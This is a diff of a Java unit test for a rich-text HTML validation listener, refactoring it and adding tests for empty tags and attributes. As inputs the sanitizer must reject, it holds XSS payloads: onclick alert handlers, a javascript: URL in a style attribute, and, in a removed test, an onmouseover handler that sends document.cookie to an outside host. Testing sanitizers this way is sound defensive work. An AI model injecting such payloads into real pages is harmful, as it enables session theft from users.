@@ -15,7 +15,7 @@ class RichTextAreaValidationListenerTest {
     @BeforeEach
     void setUp() {
         listener =
-            new RichTextAreaValidationListener(new String[]{"p", "br", "strong"});
+            new RichTextAreaValidationListener();
     }
 
     @Test
@@ -23,7 +23,13 @@ class RichTextAreaValidationListenerTest {
         listener.discardedTag(null, "RichTextAreaField");
         assertEquals(1, listener.getErrors().size());
         assertEquals("Enter valid tags for RichTextArea field: RichTextAreaField",
-            listener.getErrors().get(0));
+            listener.getErrors().getFirst());
+    }
+
+    @Test
+    void testDiscardedEmptyTag() {
+        listener.discardedTag(null, "");
+        assertEquals(0, listener.getErrors().size());
     }
 
     @Test
@@ -31,7 +37,15 @@ class RichTextAreaValidationListenerTest {
         listener.discardedAttributes(null, "div", "onclick");
         assertEquals(1, listener.getErrors().size());
         assertEquals("Enter valid attributes for RichTextArea field: div[onclick]",
-            listener.getErrors().get(0));
+            listener.getErrors().getFirst());
+    }
+
+    @Test
+    void testDiscardedEmptyAttributes() {
+        listener.discardedAttributes(null, "div", "");
+        assertEquals(1, listener.getErrors().size());
+        assertEquals("Enter valid attributes for RichTextArea field: div[]",
+            listener.getErrors().getFirst());
     }
 
     @Test
@@ -39,33 +53,7 @@ class RichTextAreaValidationListenerTest {
         listener.discardedAttributes(null, "p", "onclick=\"alert(1)\"");
         assertEquals(1, listener.getErrors().size());
         assertEquals("Enter valid attributes for RichTextArea field: p[onclick=\"alert(1)\"]",
-            listener.getErrors().get(0));
+            listener.getErrors().getFirst());
     }
 
-    @Test
-    void testDiscardedAttributesOnMouseover() {
-        RichTextAreaValidationListener listener =
-            new RichTextAreaValidationListener(new String[]{"p", "br", "strong"});
-
-        listener.discardedAttributes(null, "p",
-            "onmouseover=\"fetch('//ccd/'+document.cookie)\"");
-
-        assertEquals(1, listener.getErrors().size());
-        assertEquals(
-            "Enter valid attributes for RichTextArea field: "
-                + "p[onmouseover=\"fetch('//ccd/'+document.cookie)\"]",
-            listener.getErrors().get(0));
-    }
-
-    @Test
-    void testDiscardedAttributesStyle() {
-        listener.discardedAttributes(null, "p",
-            "style=\"background:url(javascript:alert(1))");
-
-        assertEquals(1, listener.getErrors().size());
-        assertEquals(
-            "Enter valid attributes for RichTextArea field: "
-                + "p[style=\"background:url(javascript:alert(1))]",
-            listener.getErrors().get(0));
-    }
 }
